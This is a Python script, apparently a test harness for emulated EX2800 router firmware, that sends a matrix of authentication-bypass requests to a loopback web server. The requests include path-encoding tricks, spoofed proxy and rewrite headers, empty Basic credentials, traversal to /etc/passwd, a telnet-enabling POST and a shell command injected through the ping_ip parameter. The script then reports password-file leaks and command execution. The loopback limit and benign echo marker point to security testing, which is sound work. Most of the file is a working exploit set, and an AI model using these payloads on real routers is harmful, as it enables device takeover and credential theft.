#!/usr/bin/env python3
"""Loopback-only EX2800 HTTP authentication-boundary matrix."""

import argparse
import base64
import ipaddress
import os
import socket
import time


def loopback(value: str) -> str:
    address = ipaddress.ip_address(socket.gethostbyname(value))
    if not address.is_loopback:
        raise argparse.ArgumentTypeError("target must resolve to loopback")
    return str(address)


def request(target: str, port: int, method: str, path: str, headers=None, body=b""):
    headers = headers or {}
    lines = [f"{method} {path} HTTP/1.0", "Host: localhost"]
    lines.extend(f"{key}: {value}" for key, value in headers.items())
    if body:
        lines.append(f"Content-Length: {len(body)}")
        lines.append("Content-Type: application/x-www-form-urlencoded")
    wire = ("\r\n".join(lines) + "\r\n\r\n").encode() + body
    data = b""
    try:
        with socket.create_connection((target, port), timeout=1) as client:
            client.settimeout(1)
            client.sendall(wire)
            while len(data) < 65536:
                chunk = client.recv(4096)
                if not chunk:
                    break
                data += chunk
    except (OSError, socket.timeout):
        pass
    first = data.split(b"\r\n", 1)[0].decode("latin-1", "replace")
    return first or "NO_RESPONSE", data


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", type=loopback, default="127.0.0.1")
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--firmware-root", default="/firmware")
    args = parser.parse_args()

    marker = os.path.join(args.firmware_root, "var/tmp/friday-auth-matrix")
    try:
        os.unlink(marker)
    except FileNotFoundError:
        pass

    injection = (
        "getpage=debug.htm&ping_ip=127.0.0.1%3B"
        "echo%20FRIDAY_AUTH_MATRIX%3E%2Fvar%2Ftmp%2Ffriday-auth-matrix"
    )
    basic_empty = base64.b64encode(b":").decode()
    cases = [
        ("plain_webproc", "GET", "/cgi-bin/webproc?getpage=debug.htm", {}, b""),
        ("dot_segment", "GET", "/./cgi-bin/webproc?getpage=debug.htm", {}, b""),
        ("double_slash", "GET", "//cgi-bin/webproc?getpage=debug.htm", {}, b""),
        ("encoded_cgi", "GET", "/%63gi-bin/webproc?getpage=debug.htm", {}, b""),
        ("encoded_slash", "GET", "/cgi-bin%2fwebproc?getpage=debug.htm", {}, b""),
        ("semicolon_path", "GET", "/cgi-bin/webproc;/x?getpage=debug.htm", {}, b""),
        ("path_info", "GET", "/cgi-bin/webproc/x?getpage=debug.htm", {}, b""),
        ("traversal_passwd", "GET", "/cgi-bin/webproc?getpage=../../etc/passwd", {}, b""),
        ("encoded_traversal", "GET", "/cgi-bin/webproc?getpage=..%2f..%2fetc%2fpasswd", {}, b""),
        ("proxy_local", "GET", "/cgi-bin/webproc?getpage=debug.htm",
         {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"}, b""),
        ("original_url", "GET", "/",
         {"X-Original-URL": "/cgi-bin/webproc?getpage=debug.htm"}, b""),
        ("rewrite_url", "GET", "/",
         {"X-Rewrite-URL": "/cgi-bin/webproc?getpage=debug.htm"}, b""),
        ("empty_basic", "GET", "/cgi-bin/webproc?getpage=debug.htm",
         {"Authorization": f"Basic {basic_empty}"}, b""),
        ("malformed_basic", "GET", "/cgi-bin/webproc?getpage=debug.htm",
         {"Authorization": "Basic !!!"}, b""),
        ("empty_cookie", "GET", "/cgi-bin/webproc?getpage=debug.htm",
         {"Cookie": "session=; auth=1; login=1"}, b""),
        ("head_method", "HEAD", "/cgi-bin/webproc?getpage=debug.htm", {}, b""),
        ("options_method", "OPTIONS", "/cgi-bin/webproc?getpage=debug.htm", {}, b""),
        ("post_override", "POST", "/cgi-bin/webproc",
         {"X-HTTP-Method-Override": "GET"}, b"getpage=debug.htm"),
        ("setup_page", "GET", "/html/login_pwd_setup.htm", {}, b""),
        ("password_reset", "GET", "/html/passwd_reset.html", {}, b""),
        ("super_setting", "GET", "/super_setting.htm", {}, b""),
        ("webupg_start_telnet", "POST", "/cgi-bin/webupg", {},
         b"start_telnet=1"),
        ("inject_plain", "GET", f"/cgi-bin/webproc?{injection}", {}, b""),
        ("inject_dot", "GET", f"/./cgi-bin/webproc?{injection}", {}, b""),
        ("inject_proxy", "GET", f"/cgi-bin/webproc?{injection}",
         {"X-Forwarded-For": "127.0.0.1"}, b""),
    ]

    privileged = False
    for name, method, path, headers, body in cases:
        status, response = request(args.target, args.port, method, path, headers, body)
        leaked = b"root:x:0:0:" in response or b"root:$1$" in response
        marked = os.path.exists(marker)
        privileged |= leaked or marked
        print(
            f"{name}: status={status!r} credential_leak={str(leaked).lower()} "
            f"command_marker={str(marked).lower()}"
        )
        time.sleep(0.05)

    print(f"authentication_bypass_with_privileged_effect={str(privileged).lower()}")
    return 1 if privileged else 0


if __name__ == "__main__":
    raise SystemExit(main())
